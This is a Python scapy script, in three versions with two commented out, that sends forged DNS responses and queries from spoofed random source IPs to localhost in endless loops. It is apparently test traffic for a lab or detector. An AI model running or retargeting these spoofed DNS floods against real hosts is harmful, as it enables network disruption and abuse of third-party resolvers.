# from scapy.all import *
# import threading
# import time
# import random

# # List of pre-defined IP addresses
# ips = [str(RandIP()) for _ in range(5)]

# # Function to send DNS response packets using the list of IPs repeatedly
# def send_dns_responses():
#     while True:
#         for ip in ips:
#             target_ip = "127.0.0.1"  # Destination IP address
#             print("Target ip",target_ip)
#             print(f"Generated IP that is attacking: {ip}")  # Print generated IP
#             dns_response = IP(dst=target_ip)/UDP()/DNS(id=random.randint(1, 65535), qr=1, an=DNSRR(rrname="example.com", rdata=ip))
#             send(dns_response, verbose=False)  # Send the packet
#         time.sleep(1)  # Adjust the frequency of responses as needed

# # Start sending DNS response packets in a separate thread
# dns_thread = threading.Thread(target=send_dns_responses)
# dns_thread.start()

# # Keep the program running
# while True:
#     time.sleep(1)







# from scapy.all import *
# import threading
# import time
# import random

# # List of pre-defined IP addresses
# ips = [str(RandIP()) for _ in range(2)]

# # Function to send DNS response packets using the list of IPs repeatedly
# def send_dns_requests():
#     while True:
#         for ip in ips:
#             src_ip = RandIP()  # Generate a random source IP address
#             target_ip = "127.0.0.1"  # Destination IP address
#             print("Target ip",target_ip)
#             print(f"Generated IP that is attacking: {src_ip}")  # Print generated IP
#             dns_request = IP(src=src_ip, dst=target_ip)/UDP()/DNS(rd=1, qd=DNSQR(qname="example.com"))
#             send(dns_request, verbose=False)  # Send the packet
#         time.sleep(0.1)  # Adjust the frequency of requests as needed

# # Start sending DNS request packets in a separate thread
# dns_thread = threading.Thread(target=send_dns_requests)
# dns_thread.start()

# # Keep the program running
# while True:
#     time.sleep(1)



from scapy.all import *
import threading
import time
import random

# Generate 2 random source IP addresses for the attack
source_ips = [str(RandIP()) for _ in range(2)]

# Function to send DNS response packets using the list of IPs repeatedly
def send_dns_requests():
    while True:
        for src_ip in source_ips:
            target_ip = "127.0.0.1"  # Use the fixed target IP address
            print("Target ip", target_ip)
            print(f"Generated IP that is attacking: {src_ip}")  # Print generated IP
            dns_request = IP(src=src_ip, dst=target_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname="example.com"))
            send(dns_request, verbose=False)  # Send the packet
            time.sleep(1)  # Adjust the frequency of requests as needed

# Start sending DNS request packets in a separate thread
dns_thread = threading.Thread(target=send_dns_requests)
dns_thread.start()

# Keep the program running
while True:
    time.sleep(1)


